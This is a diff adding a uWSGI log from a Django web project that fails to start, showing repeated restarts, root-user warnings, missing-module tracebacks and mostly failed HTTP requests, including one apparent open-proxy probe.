@@ -1,0 +1,1504 @@
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 01:16:35 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenvs/big_data/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8888 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:46359 (port auto-assigned) fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Python main interpreter initialized at 0x18fe0e0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x18fe0e0 pid: 8506 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 8506)
+spawned uWSGI worker 1 (pid: 8508, cores: 2)
+spawned uWSGI worker 2 (pid: 8509, cores: 2)
+spawned uWSGI worker 3 (pid: 8510, cores: 2)
+spawned uWSGI worker 4 (pid: 8511, cores: 2)
+spawned uWSGI http 1 (pid: 8512)
+[pid: 8508|app: 0|req: 1/1] 122.96.42.165 () {38 vars in 701 bytes} [Wed Feb  5 02:14:30 2020] GET /hello => generated 0 bytes in 10 msecs (HTTP/1.1 301) 3 headers in 112 bytes (1 switches on core 0)
+[pid: 8508|app: 0|req: 2/2] 122.96.42.165 () {38 vars in 703 bytes} [Wed Feb  5 02:14:30 2020] GET /hello/ => generated 5 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 107 bytes (1 switches on core 1)
+[pid: 8511|app: 0|req: 1/3] 122.96.42.165 () {38 vars in 646 bytes} [Wed Feb  5 02:14:31 2020] GET /favicon.ico => generated 77 bytes in 23 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 0)
+[pid: 8511|app: 0|req: 2/4] 122.96.42.165 () {38 vars in 701 bytes} [Wed Feb  5 02:14:39 2020] GET /login => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 112 bytes (1 switches on core 1)
+[pid: 8508|app: 0|req: 3/5] 122.96.42.165 () {38 vars in 703 bytes} [Wed Feb  5 02:14:39 2020] GET /login/ => generated 1121 bytes in 21 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 8511|app: 0|req: 3/6] 122.96.42.165 () {38 vars in 680 bytes} [Wed Feb  5 02:14:39 2020] GET /static/node_modules/jquery/dist/jquery.slim.js => generated 77 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 1)
+[pid: 8508|app: 0|req: 4/7] 122.96.42.165 () {38 vars in 675 bytes} [Wed Feb  5 02:14:39 2020] GET /static/Front_End/login/css/login.css => generated 77 bytes in 15 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 1)
+[pid: 8510|app: 0|req: 1/9] 122.96.42.165 () {38 vars in 689 bytes} [Wed Feb  5 02:14:39 2020] GET /static/Front_End/general/css/reg%26login.css => generated 77 bytes in 57 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 0)
+[pid: 8509|app: 0|req: 1/9] 122.96.42.165 () {38 vars in 656 bytes} [Wed Feb  5 02:14:39 2020] GET /static/Front_End/login/js/login.js => generated 77 bytes in 58 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 0)
+SIGINT/SIGQUIT received...killing workers...
+gateway "uWSGI http 1" has been buried (pid: 8512)
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 02:25:42 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8888 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Python main interpreter initialized at 0xb28fc0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+Traceback (most recent call last):
+  File "big_data_web/wsgi.py", line 12, in <module>
+    from django.core.wsgi import get_wsgi_application
+ImportError: No module named 'django'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 9126)
+spawned uWSGI worker 1 (pid: 9127, cores: 2)
+spawned uWSGI worker 2 (pid: 9128, cores: 2)
+spawned uWSGI worker 3 (pid: 9129, cores: 2)
+spawned uWSGI worker 4 (pid: 9130, cores: 2)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+--- no python application found, check your startup logs for errors ---
+[pid: 9127|app: -1|req: -1/1] 122.96.42.165 () {46 vars in 814 bytes} [Wed Feb  5 02:35:49 2020] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 9127|app: -1|req: -1/2] 122.96.42.165 () {42 vars in 731 bytes} [Wed Feb  5 02:35:58 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 9127|app: -1|req: -1/3] 122.96.42.165 () {42 vars in 721 bytes} [Wed Feb  5 02:36:11 2020] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 9127|app: -1|req: -1/4] 122.96.42.165 () {44 vars in 752 bytes} [Wed Feb  5 02:36:23 2020] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+--- no python application found, check your startup logs for errors ---
+[pid: 9127|app: -1|req: -1/5] 122.96.42.165 () {42 vars in 731 bytes} [Wed Feb  5 02:37:28 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+--- no python application found, check your startup logs for errors ---
+[pid: 9127|app: -1|req: -1/6] 122.96.42.165 () {44 vars in 762 bytes} [Wed Feb  5 02:45:31 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 9127|app: -1|req: -1/7] 122.96.42.165 () {42 vars in 721 bytes} [Wed Feb  5 02:48:12 2020] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 9127|app: -1|req: -1/8] 122.96.42.165 () {44 vars in 752 bytes} [Wed Feb  5 02:56:58 2020] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 9127|app: -1|req: -1/9] 122.96.42.165 () {42 vars in 731 bytes} [Wed Feb  5 02:57:02 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 03:00:58 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8888 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:34607 (port auto-assigned) fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Python main interpreter initialized at 0x14fc0d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+Traceback (most recent call last):
+  File "big_data_web/wsgi.py", line 12, in <module>
+    from django.core.wsgi import get_wsgi_application
+ImportError: No module named 'django'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 9392)
+spawned uWSGI worker 1 (pid: 9393, cores: 2)
+spawned uWSGI worker 2 (pid: 9394, cores: 2)
+spawned uWSGI worker 3 (pid: 9395, cores: 2)
+spawned uWSGI worker 4 (pid: 9396, cores: 2)
+spawned uWSGI http 1 (pid: 9397)
+--- no python application found, check your startup logs for errors ---
+[pid: 9393|app: -1|req: -1/1] 127.0.0.1 () {28 vars in 305 bytes} [Wed Feb  5 03:01:13 2020] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+SIGINT/SIGQUIT received...killing workers...
+gateway "uWSGI http 1" has been buried (pid: 9397)
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 03:02:08 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8888 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:46107 (port auto-assigned) fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Python main interpreter initialized at 0xa900d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+Traceback (most recent call last):
+  File "big_data_web/wsgi.py", line 12, in <module>
+    from django.core.wsgi import get_wsgi_application
+ImportError: No module named 'django'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 9426)
+spawned uWSGI worker 1 (pid: 9427, cores: 2)
+spawned uWSGI worker 2 (pid: 9428, cores: 2)
+spawned uWSGI worker 3 (pid: 9429, cores: 2)
+spawned uWSGI worker 4 (pid: 9430, cores: 2)
+spawned uWSGI http 1 (pid: 9431)
+--- no python application found, check your startup logs for errors ---
+[pid: 9430|app: -1|req: -1/1] 122.96.42.165 () {38 vars in 701 bytes} [Wed Feb  5 03:03:00 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9428|app: -1|req: -1/2] 122.96.42.165 () {38 vars in 691 bytes} [Wed Feb  5 03:03:04 2020] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9430|app: -1|req: -1/3] 127.0.0.1 () {28 vars in 305 bytes} [Wed Feb  5 03:07:54 2020] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9430|app: -1|req: -1/4] 127.0.0.1 () {28 vars in 315 bytes} [Wed Feb  5 03:08:08 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9430|app: -1|req: -1/5] 127.0.0.1 () {28 vars in 315 bytes} [Wed Feb  5 03:08:41 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9430|app: -1|req: -1/6] 5.178.86.74 () {36 vars in 670 bytes} [Wed Feb  5 03:12:32 2020] POST http://check.best-proxies.ru/azenv.php?s=158084355265390PC079533568908888 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9428|app: -1|req: -1/7] 5.178.86.74 () {24 vars in 319 bytes} [Wed Feb  5 03:12:37 2020] CONNECT check.best-proxies.ru:80 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9430|app: -1|req: -1/8] 122.96.42.165 () {38 vars in 701 bytes} [Wed Feb  5 03:14:56 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9428|app: -1|req: -1/9] 122.96.42.165 () {38 vars in 645 bytes} [Wed Feb  5 03:14:57 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9430|app: -1|req: -1/10] 122.96.42.165 () {38 vars in 645 bytes} [Wed Feb  5 03:15:26 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9429|app: -1|req: -1/11] 122.96.42.165 () {40 vars in 732 bytes} [Wed Feb  5 03:15:28 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9428|app: -1|req: -1/12] 122.96.42.165 () {42 vars in 698 bytes} [Wed Feb  5 03:15:28 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9430|app: -1|req: -1/13] 122.96.42.165 () {40 vars in 732 bytes} [Wed Feb  5 03:15:29 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9430|app: -1|req: -1/14] 122.96.42.165 () {42 vars in 698 bytes} [Wed Feb  5 03:15:29 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9430|app: -1|req: -1/15] 122.96.42.165 () {38 vars in 691 bytes} [Wed Feb  5 03:15:31 2020] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9430|app: -1|req: -1/16] 122.96.42.165 () {38 vars in 640 bytes} [Wed Feb  5 03:15:32 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+gateway "uWSGI http 1" has been buried (pid: 9431)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 9427)...
+Gracefully killing worker 2 (pid: 9428)...
+Gracefully killing worker 3 (pid: 9429)...
+Gracefully killing worker 4 (pid: 9430)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /var/www/big_data_web
+closing all non-uwsgi socket fds > 2 (max_fd = 65535)...
+found fd 3 mapped to socket 0 (127.0.0.1:46107)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 03:16:54 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8888 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:39158 (port auto-assigned) fd 4
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Python main interpreter initialized at 0x248ffa0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+Traceback (most recent call last):
+  File "big_data_web/wsgi.py", line 12, in <module>
+    from django.core.wsgi import get_wsgi_application
+ImportError: No module named 'django'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 9426)
+spawned uWSGI worker 1 (pid: 9526, cores: 2)
+spawned uWSGI worker 2 (pid: 9527, cores: 2)
+spawned uWSGI worker 3 (pid: 9528, cores: 2)
+spawned uWSGI worker 4 (pid: 9529, cores: 2)
+spawned uWSGI http 1 (pid: 9530)
+--- no python application found, check your startup logs for errors ---
+[pid: 9529|app: -1|req: -1/1] 122.96.42.165 () {40 vars in 722 bytes} [Wed Feb  5 03:16:59 2020] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9528|app: -1|req: -1/2] 122.96.42.165 () {42 vars in 693 bytes} [Wed Feb  5 03:17:00 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9529|app: -1|req: -1/3] 122.96.42.165 () {38 vars in 701 bytes} [Wed Feb  5 03:17:04 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9527|app: -1|req: -1/4] 122.96.42.165 () {38 vars in 645 bytes} [Wed Feb  5 03:17:04 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+SIGINT/SIGQUIT received...killing workers...
+gateway "uWSGI http 1" has been buried (pid: 9530)
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 03:18:42 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8888 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:45309 (port auto-assigned) fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Python main interpreter initialized at 0x1c120d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+Traceback (most recent call last):
+  File "big_data_web/wsgi.py", line 12, in <module>
+    from django.core.wsgi import get_wsgi_application
+ImportError: No module named 'django'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 9553)
+spawned uWSGI worker 1 (pid: 9554, cores: 2)
+spawned uWSGI worker 2 (pid: 9555, cores: 2)
+spawned uWSGI worker 3 (pid: 9556, cores: 2)
+spawned uWSGI worker 4 (pid: 9557, cores: 2)
+spawned uWSGI http 1 (pid: 9558)
+SIGINT/SIGQUIT received...killing workers...
+gateway "uWSGI http 1" has been buried (pid: 9558)
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 03:19:52 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8888 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:46329 (port auto-assigned) fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Python main interpreter initialized at 0x1f3b0f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+Traceback (most recent call last):
+  File "big_data_web/wsgi.py", line 12, in <module>
+    from django.core.wsgi import get_wsgi_application
+ImportError: No module named 'django'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 9574)
+spawned uWSGI worker 1 (pid: 9575, cores: 2)
+spawned uWSGI worker 2 (pid: 9576, cores: 2)
+spawned uWSGI worker 3 (pid: 9577, cores: 2)
+spawned uWSGI worker 4 (pid: 9578, cores: 2)
+spawned uWSGI http 1 (pid: 9579)
+--- no python application found, check your startup logs for errors ---
+[pid: 9577|app: -1|req: -1/1] 122.96.42.165 () {40 vars in 721 bytes} [Wed Feb  5 03:20:07 2020] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9578|app: -1|req: -1/2] 122.96.42.165 () {42 vars in 692 bytes} [Wed Feb  5 03:20:07 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
